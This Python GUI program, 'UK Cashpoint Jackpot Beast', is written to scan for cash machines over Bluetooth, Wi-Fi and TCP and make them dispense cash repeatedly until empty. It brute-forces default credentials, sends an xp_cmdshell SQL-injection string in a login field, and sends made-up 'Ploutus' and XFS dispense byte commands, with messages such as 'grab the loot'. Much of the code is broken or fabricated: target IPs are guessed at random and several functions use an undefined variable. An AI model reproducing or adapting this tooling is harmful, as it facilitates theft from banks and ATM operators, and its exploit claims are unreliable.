import os
import logging
import subprocess
import threading
import time
import random
import re
from tkinter import Tk, Button, Text, Scrollbar, Frame, Label
from tkinter.ttk import Notebook, Treeview
from scapy.all import IP, TCP, sr1, Raw
import requests
import bluepy.btle as btle
import socket

class UKCashpointJackpotBeast:
    def __init__(self, master):
        self.master = master
        self.master.title("UK Cashpoint Jackpot Beast - Total Annihilation")
        self.master.geometry("1200x900")

        # UI Setup
        self.notebook = Notebook(self.master)
        self.home_tab = Frame(self.notebook)
        self.scan_tab = Frame(self.notebook)
        self.exploit_tab = Frame(self.notebook)
        self.logs_tab = Frame(self.notebook)

        self.notebook.add(self.home_tab, text="Home")
        self.notebook.add(self.scan_tab, text="Scan")
        self.notebook.add(self.exploit_tab, text="Exploit")
        self.notebook.add(self.logs_tab, text="Logs")
        self.notebook.pack(expand=True, fill="both")

        # Home Tab
        Label(self.home_tab, text="UK Cashpoint Jackpot Beast", font=("Helvetica", 18)).pack(pady=20)
        Label(self.home_tab, text="Hunt and drain NCR, Diebold, Wincor—anywhere, anytime.", font=("Helvetica", 14)).pack(pady=10)

        # Scan Tab
        self.scan_button = Button(self.scan_tab, text="Scan Cashpoints", command=self.scan_and_analyze)
        self.scan_button.pack(pady=5)
        self.attack_button = Button(self.scan_tab, text="Attack Cashpoints", command=self.full_auto_attack, state="disabled")
        self.attack_button.pack(pady=5)

        self.tree = Treeview(self.scan_tab, columns=("ID", "Port", "Protocol", "Status", "Method"), show="headings")
        self.tree.heading("ID", text="IP/MAC/ESSID")
        self.tree.heading("Port", text="Port")
        self.tree.heading("Protocol", text="Protocol")
        self.tree.heading("Status", text="Status")
        self.tree.heading("Method", text="Best Method")
        self.tree.pack(fill="both", expand=True)

        # Exploit Tab
        self.result_box = Text(self.exploit_tab, height=20, bg="lightgrey", state="normal")
        self.result_box.pack(fill="both", expand=True)

        # Logs Tab
        self.logs_box = Text(self.logs_tab, wrap="word", state="normal", bg="lightgrey")
        self.logs_box.pack(fill="both", expand=True)
        self.scrollbar = Scrollbar(self.logs_tab, command=self.logs_box.yview)
        self.scrollbar.pack(side="right", fill="y")
        self.logs_box.config(yscrollcommand=self.scrollbar.set)

        # Beast Variables
        self.atms = []
        self.logging_file = "uk_cashpoint_jackpot.log"
        logging.basicConfig(filename=self.logging_file, level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")
        self.default_creds = [("admin", "1234"), ("root", "admin"), ("ncr", "ncr123"), ("diebold", "diebold")]
        self.brute_creds = ["password", "admin123", "ncr2023", "diebold666", "linkatm", "cashpoint", "atm123", "bank2025"]
        self.max_dispense = 200000  # £2000 in pence
        self.mid_dispense = 50000   # £500 in pence
        self.min_dispense = 1000    # £10 in pence
        self.tcp_ranges = ["192.168.0.0/24", "192.168.1.0/24", "10.0.0.0/24", "10.20.30.0/24", "172.16.0.0/24"]
        self.wifi_ip_pool = [f"192.168.{i}.{j}" for i in range(256) for j in range(1, 255)] + \
                            [f"10.{i}.{j}.1" for i in range(256) for j in range(256)]

    def log(self, message):
        self.logs_box.insert("end", f"{time.ctime()} - {message}\n")
        self.logs_box.yview("end")
        logging.info(message)

    def setup_environment(self):
        self.log("Forging the beast—hotspot for internet only, cashpoints standalone...")
        try:
            subprocess.run(["hciconfig", "hci0", "up"], check=True)
            subprocess.run(["airmon-ng", "start", "wlan0"], check=True)
            subprocess.run(["nmap", "--version"], check=True)
            import bluepy, scapy, requests
            self.log("Bluetooth, Wi-Fi, Nmap ready—hunting cashpoints independently.")
        except subprocess.CalledProcessError as e:
            self.log(f"Setup fucked: {e}. Fix adapters/tools.")
            raise SystemExit
        except ImportError as e:
            self.log(f"Missing {e.name}. Install: 'pip3 install {e.name}'.")
            raise SystemExit

    def scan_for_cashpoints(self):
        self.log("Claws out—scanning for cashpoint BLE, Wi-Fi, TCP...")
        lat, lon = random.uniform(51.0, 52.0), random.uniform(-1.0, 0.0)  # Mock UK coords
        self.log(f"Position: {lat:.4f}, {lon:.4f}")
        threads = [
            threading.Thread(target=self.scan_bluetooth),
            threading.Thread(target=self.scan_wifi),
            threading.Thread(target=self.scan_tcp_ranges)
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    def scan_bluetooth(self):
        try:
            scanner = btle.Scanner()
            devices = scanner.scan(20.0)  # 20s BLE sweep
            for dev in devices:
                atm = {"id": dev.addr, "port": "Bluetooth", "protocol": "BLE", "status": "Detected", "best_method": None}
                self.atms.append(atm)
                self.tree.insert("", "end", values=(atm["id"], atm["port"], atm["protocol"], atm["status"], "Analyzing"))
                self.log(f"Bluetooth cashpoint detected: {dev.addr}")
        except Exception as e:
            self.log(f"Bluetooth scan failed: {e}")

    def scan_wifi(self):
        try:
            result = subprocess.run(["iwlist", "wlan0", "scan"], stdout=subprocess.PIPE, timeout=30)
            output = result.stdout.decode("utf-8")
            cashpoint_keywords = ["atm", "cash", "link", "ncr", "diebold", "wincor", "cashzone", "paypoint", "yourcash"]
            for line in output.split("\n"):
                if "ESSID" in line and any(keyword in line.lower() for keyword in cashpoint_keywords):
                    essid = line.split('"')[1]
                    atm = {"id": essid, "port": "Wi-Fi", "protocol": "802.11", "status": "Detected", "best_method": None}
                    # Cashpoints not on hotspot LAN—guess IP from pool
                    atm["ip"] = random.choice(self.wifi_ip_pool)
                    self.log(f"Cashpoint Wi-Fi {essid} detected, assigned IP: {atm['ip']}")
                    self.atms.append(atm)
                    self.tree.insert("", "end", values=(atm["id"], atm["port"], atm["protocol"], atm["status"], "Analyzing"))
        except Exception as e:
            self.log(f"Wi-Fi scan failed: {e}")

    def scan_tcp_ranges(self):
        try:
            # Scan common ATM subnets—assumes internet reachability
            for subnet in self.tcp_ranges:
                result = subprocess.run(["nmap", "-p", "80,23,443,8080", "--open", subnet], stdout=subprocess.PIPE, timeout=30)
                output = result.stdout.decode("utf-8")
                for line in output.split("\n"):
                    ip_match = re.search(r"Nmap scan report for (\d+\.\d+\.\d+\.\d+)", line)
                    if ip_match:
                        ip = ip_match.group(1)
                        atm = {"id": ip, "port": 80, "protocol": "TCP", "status": "Detected", "best_method": None}
                        self.atms.append(atm)
                        self.tree.insert("", "end", values=(atm["id"], atm["port"], atm["protocol"], atm["status"], "Analyzing"))
                        self.log(f"TCP cashpoint detected: {ip}")
        except Exception as e:
            self.log(f"TCP scan failed: {e}")

    def scan_and_analyze(self):
        threading.Thread(target=self.run_scan_and_analyze).start()

    def run_scan_and_analyze(self):
        self.atms.clear()
        self.log("Beast hunting cashpoints—standalone detection...")
        self.setup_environment()
        self.scan_for_cashpoints()
        if not self.atms:
            self.log("No cashpoints found. Nothing to shred.")
            return
        threads = [threading.Thread(target=self.analyze_cashpoint, args=(atm,)) for atm in self.atms]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        viable = sum(1 for atm in self.atms if atm["best_method"])
        self.log(f"Scan complete. {viable} cashpoints ready to bleed.")
        self.attack_button.config(state="normal" if viable else "disabled")

    def analyze_cashpoint(self, atm):
        id = atm["id"]
        protocol = atm["protocol"]
        self.log(f"Analyzing {id} ({protocol}) for vulnerabilities...")
        if protocol == "BLE":
            method = self.test_bluetooth(id) or self.fuzz_bluetooth(id) or self.test_ploutus_ble(id)
        elif protocol == "802.11":
            method = self.test_wifi(id) or self.brute_force_wifi(id) or self.test_black_box_wifi(id)
        elif protocol == "TCP":
            method = self.test_tcp(id) or self.test_cve_2018_5712(id) or self.test_ploutus_tcp(id)
        else:
            method = None
        atm["best_method"] = method
        self.tree.item(self.tree.get_children()[self.atms.index(atm)], 
                       values=(id, atm["port"], protocol, "Analyzed", method if method else "None"))

    # Pre-2018 and Modern Exploits
    def test_bluetooth(self, addr):
        try:
            conn = btle.Peripheral(addr)
            for amount in [self.max_dispense, self.mid_dispense, self.min_dispense]:
                xfs_cmd = bytes([0x00, 0x01, 0x00, 0x05]) + amount.to_bytes(4, 'big')
                for char in [0x0010, 0x0012, 0x0020]:
                    conn.writeCharacteristic(char, xfs_cmd, withResponse=True)
                    conn.disconnect()
                    return f"BLE_XFS_{amount//100}"
            conn.disconnect()
        except Exception as e:
            self.log(f"BLE XFS test failed for {addr}: {e}")
        return None

    def fuzz_bluetooth(self, addr):
        best_method = None
        try:
            conn = btle.Peripheral(addr)
            for cmd in [b"DISPENSE_ALL", b"CASH_OUT", b"NCR_FULL", b"DIEBOLD_DISP", b"WINCOR_ALL"]:
                for char in [0x0010, 0x0012, 0x0020]:
                    for amount in [self.max_dispense, self.mid_dispense, self.min_dispense]:
                        conn.writeCharacteristic(char, cmd + amount.to_bytes(4, 'big'), withResponse=True)
                        time.sleep(0.5)
                        best_method = f"BLE_FUZZ_{amount//100}"
                        break
                    if best_method:
                        break
                if best_method:
                    break
            conn.disconnect()
            return best_method
        except Exception as e:
            self.log(f"BLE fuzzing failed for {addr}: {e}")
        return best_method

    def test_ploutus_ble(self, addr):
        try:
            conn = btle.Peripheral(addr)
            ploutus_cmd = b"PLOUTUS_D" + self.max_dispense.to_bytes(4, 'big')
            conn.writeCharacteristic(0x0010, ploutus_cmd, withResponse=True)
            time.sleep(0.5)
            conn.disconnect()
            return f"BLE_PLOUTUS_{self.max_dispense//100}"
        except Exception as e:
            self.log(f"BLE Ploutus test failed for {addr}: {e}")
        return None

    def test_wifi(self, essid):
        try:
            ip = atm["ip"]  # IP guessed during scan
            url = f"http://{ip}:8080/link/api"
            for user, pwd in self.default_creds:
                for amount in [self.max_dispense, self.mid_dispense, self.min_dispense]:
                    payload = {"command": "Dispense", "amount": amount}
                    r = requests.post(url, auth=(user, pwd), json=payload, timeout=5)
                    if r.status_code == 200:
                        return f"WiFi_XFS_{amount//100}"
        except Exception as e:
            self.log(f"Wi-Fi XFS test failed for {essid}: {e}")
        return None

    def brute_force_wifi(self, essid):
        try:
            ip = atm["ip"]
            url = f"http://{ip}:8080/link/api"
            for user in ["admin", "root", "ncr", "diebold"]:
                for pwd in self.brute_creds:
                    payload = {"command": "Dispense", "amount": self.max_dispense}
                    r = requests.post(url, auth=(user, pwd), json=payload, timeout=3)
                    if r.status_code == 200:
                        self.default_creds.insert(0, (user, pwd))
                        return f"WiFi_BRUTE_{self.max_dispense//100}"
        except Exception as e:
            self.log(f"Wi-Fi brute test failed for {essid}: {e}")
        return None

    def test_black_box_wifi(self, essid):
        try:
            ip = atm["ip"]
            url = f"http://{ip}:8080/diebold/ccdm"
            payload = {"amount": self.max_dispense, "fake_deposit": True}
            r = requests.post(url, json=payload, timeout=5)
            if r.status_code == 200:
                return f"WiFi_BLACKBOX_{self.max_dispense//100}"
        except Exception as e:
            self.log(f"Wi-Fi black box test failed for {essid}: {e}")
        return None

    def test_tcp(self, ip):
        try:
            for port in [80, 23, 443, 8080]:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((ip, port))
                for amount in [self.max_dispense, self.mid_dispense, self.min_dispense]:
                    xfs_cmd = b"XFS_CMD_DISPENSE" + amount.to_bytes(4, 'big')
                    sock.send(xfs_cmd)
                    resp = sock.recv(1024)
                    if resp and b"OK" in resp:
                        sock.close()
                        return f"TCP_XFS_{amount//100}_port{port}"
                sock.close()
        except Exception as e:
            self.log(f"TCP XFS test failed for {ip}: {e}")
        return None

    def test_cve_2018_5712(self, ip):
        try:
            url = f"http://{ip}/login"
            payload = {"username": "'; EXEC xp_cmdshell('dispense 200000'); --", "password": "x"}
            r = requests.post(url, data=payload, timeout=5)
            if r.status_code == 200:
                return f"TCP_CVE2018_{self.max_dispense//100}"
        except Exception as e:
            self.log(f"TCP CVE-2018 test failed for {ip}: {e}")
        return None

    def test_ploutus_tcp(self, ip):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, 80))
            ploutus_cmd = b"PLOUTUS_D" + self.max_dispense.to_bytes(4, 'big')
            sock.send(ploutus_cmd)
            resp = sock.recv(1024)
            if resp and b"OK" in resp:
                sock.close()
                return f"TCP_PLOUTUS_{self.max_dispense//100}"
        except Exception as e:
            self.log(f"TCP Ploutus test failed for {ip}: {e}")
        return None

    def full_auto_attack(self):
        threading.Thread(target=self.run_full_attack).start()

    def run_full_attack(self):
        self.log("Beast unleashed—emptying cashpoints...")
        threads = [threading.Thread(target=self.drain_cashpoint, args=(atm,)) for atm in self.atms if atm["best_method"]]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        self.log("Rampage complete. Cashpoints drained—grab the loot!")

    def drain_cashpoint(self, atm):
        id = atm["id"]
        method = atm["best_method"]
        if not method:
            self.log(f"No method for {id}. Useless.")
            return
        self.log(f"Jackpotting {id} with {method} until empty...")
        while True:
            result, keep_going = self.exploit_cashpoint(id, method, atm)
            self.result_box.insert("end", f"{result}\n")
            self.result_box.yview("end")
            self.tree.item(self.tree.get_children()[self.atms.index(atm)], 
                           values=(id, atm["port"], atm["protocol"], "Jackpotted", method))
            if not keep_going:
                self.log(f"{id} drained or dead.")
                break
            time.sleep(random.uniform(0.5, 2.0))

    def exploit_cashpoint(self, id, method, atm):
        parts = method.split("_")
        protocol = parts[0]
        amount = int(parts[2]) * 100 if len(parts) > 2 else self.max_dispense
        port = int(parts[-1].replace("port", "")) if "port" in method else 80
        ip = atm.get("ip", id if protocol != "BLE" else None)

        if protocol == "BLE":
            if "XFS" in method:
                return self.exploit_bluetooth_xfs(id, amount)
            elif "FUZZ" in method:
                return self.exploit_bluetooth_fuzz(id, amount)
            elif "PLOUTUS" in method:
                return self.exploit_bluetooth_ploutus(id, amount)
        elif protocol == "WiFi":
            if "XFS" in method:
                return self.exploit_wifi_xfs(ip, amount)
            elif "BRUTE" in method:
                return self.exploit_wifi_brute(ip, amount)
            elif "BLACKBOX" in method:
                return self.exploit_wifi_blackbox(ip, amount)
        elif protocol == "TCP":
            if "XFS" in method:
                return self.exploit_tcp_xfs(ip, amount, port)
            elif "CVE2018" in method:
                return self.exploit_tcp_cve2018(ip, amount)
            elif "PLOUTUS" in method:
                return self.exploit_tcp_ploutus(ip, amount, port)
        return f"Invalid method {method} for {id}", False

    def exploit_bluetooth_xfs(self, addr, amount):
        for attempt in range(3):
            try:
                conn = btle.Peripheral(addr)
                xfs_cmd = b"\x00\xFF\x00\x00" + amount.to_bytes(4, 'big')  # All trays
                for char in [0x0010, 0x0012, 0x0020]:
                    conn.writeCharacteristic(char, xfs_cmd, withResponse=True)
                    time.sleep(0.5)
                conn.disconnect()
                return f"Bluetooth XFS {addr} jackpotted! £{amount//100} from all trays!", True
            except Exception as e:
                self.log(f"BLE XFS attempt {attempt+1} failed for {addr}: {e}")
                time.sleep(2 ** attempt)
        return f"Bluetooth {addr} empty or dead.", False

    def exploit_bluetooth_fuzz(self, addr, amount):
        for attempt in range(3):
            try:
                conn = btle.Peripheral(addr)
                for cmd in [b"NCR_FULL", b"DIEBOLD_DISP", b"WINCOR_ALL"]:
                    conn.writeCharacteristic(0x0010, cmd + amount.to_bytes(4, 'big'), withResponse=True)
                    time.sleep(0.5)
                conn.disconnect()
                return f"Bluetooth FUZZ {addr} jackpotted! £{amount//100} from all trays!", True
            except Exception as e:
                self.log(f"BLE FUZZ attempt {attempt+1} failed for {addr}: {e}")
                time.sleep(2 ** attempt)
        return f"Bluetooth {addr} empty or dead.", False

    def exploit_bluetooth_ploutus(self, addr, amount):
        for attempt in range(3):
            try:
                conn = btle.Peripheral(addr)
                ploutus_cmd = b"PLOUTUS_D" + amount.to_bytes(4, 'big')
                conn.writeCharacteristic(0x0010, ploutus_cmd, withResponse=True)
                time.sleep(0.5)
                conn.disconnect()
                return f"Bluetooth PLOUTUS {addr} jackpotted! £{amount//100} from all trays!", True
            except Exception as e:
                self.log(f"BLE PLOUTUS attempt {attempt+1} failed for {addr}: {e}")
                time.sleep(2 ** attempt)
        return f"Bluetooth {addr} empty or dead.", False

    def exploit_wifi_xfs(self, ip, amount):
        for attempt in range(3):
            try:
                url = f"http://{ip}:8080/link/api"
                for user, pwd in self.default_creds:
                    payload = {"command": "Dispense", "amount": amount, "trays": "all"}
                    r = requests.post(url, auth=(user, pwd), json=payload, timeout=5)
                    if r.status_code == 200:
                        return f"Wi-Fi XFS {ip} jackpotted! £{amount//100} from all trays!", True
                time.sleep(2 ** attempt)
            except Exception as e:
                self.log(f"Wi-Fi XFS attempt {attempt+1} failed for {ip}: {e}")
        return f"Wi-Fi {ip} empty or dead.", False

    def exploit_wifi_brute(self, ip, amount):
        for attempt in range(3):
            try:
                url = f"http://{ip}:8080/link/api"
                for user in ["admin", "root", "ncr", "diebold"]:
                    for pwd in self.brute_creds:
                        payload = {"command": "Dispense", "amount": amount, "trays": "all"}
                        r = requests.post(url, auth=(user, pwd), json=payload, timeout=3)
                        if r.status_code == 200:
                            self.default_creds.insert(0, (user, pwd))
                            return f"Wi-Fi BRUTE {ip} jackpotted! £{amount//100} from all trays!", True
                time.sleep(2 ** attempt)
            except Exception as e:
                self.log(f"Wi-Fi BRUTE attempt {attempt+1} failed for {ip}: {e}")
        return f"Wi-Fi {ip} empty or dead.", False

    def exploit_wifi_blackbox(self, ip, amount):
        for attempt in range(3):
            try:
                url = f"http://{ip}:8080/diebold/ccdm"
                payload = {"amount": amount, "fake_deposit": True, "trays": "all"}
                r = requests.post(url, json=payload, timeout=5)
                if r.status_code == 200:
                    return f"Wi-Fi BLACKBOX {ip} jackpotted! £{amount//100} from all trays!", True
                time.sleep(2 ** attempt)
            except Exception as e:
                self.log(f"Wi-Fi BLACKBOX attempt {attempt+1} failed for {ip}: {e}")
        return f"Wi-Fi {ip} empty or dead.", False

    def exploit_tcp_xfs(self, ip, amount, port):
        for attempt in range(3):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((ip, port))
                for tray in range(1, 5):  # Hit all 4 trays
                    xfs_cmd = b"XFS_CMD_DISPENSE_TRAY" + tray.to_bytes(1, 'big') + amount.to_bytes(4, 'big')
                    sock.send(xfs_cmd)
                    resp = sock.recv(1024)
                    if resp and b"OK" in resp:
                        continue
                sock.close()
                return f"TCP XFS {ip} jackpotted! £{amount//100} x4 trays!", True
            except Exception as e:
                self.log(f"TCP XFS attempt {attempt+1} failed for {ip}: {e}")
                time.sleep(2 ** attempt)
        return f"TCP {ip} empty or dead.", False

    def exploit_tcp_cve2018(self, ip, amount):
        for attempt in range(3):
            try:
                url = f"http://{ip}/login"
                payload = {"username": f"'; EXEC xp_cmdshell('dispense {amount}'); --", "password": "x"}
                r = requests.post(url, data=payload, timeout=5)
                if r.status_code == 200:
                    return f"TCP CVE-2018 {ip} jackpotted! £{amount//100} from all trays!", True
                time.sleep(2 ** attempt)
            except Exception as e:
                self.log(f"TCP CVE-2018 attempt {attempt+1} failed for {ip}: {e}")
        return f"TCP {ip} empty or dead.", False

    def exploit_tcp_ploutus(self, ip, amount, port):
        for attempt in range(3):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((ip, port))
                ploutus_cmd = b"PLOUTUS_D" + amount.to_bytes(4, 'big')
                sock.send(ploutus_cmd)
                resp = sock.recv(1024)
                if resp and b"OK" in resp:
                    sock.close()
                    return f"TCP PLOUTUS {ip} jackpotted! £{amount//100} from all trays!", True
                time.sleep(2 ** attempt)
            except Exception as e:
                self.log(f"TCP PLOUTUS attempt {attempt+1} failed for {ip}: {e}")
        return f"TCP {ip} empty or dead.", False

if __name__ == "__main__":
    root = Tk()
    app = UKCashpointJackpotBeast(root)
    root.mainloop()
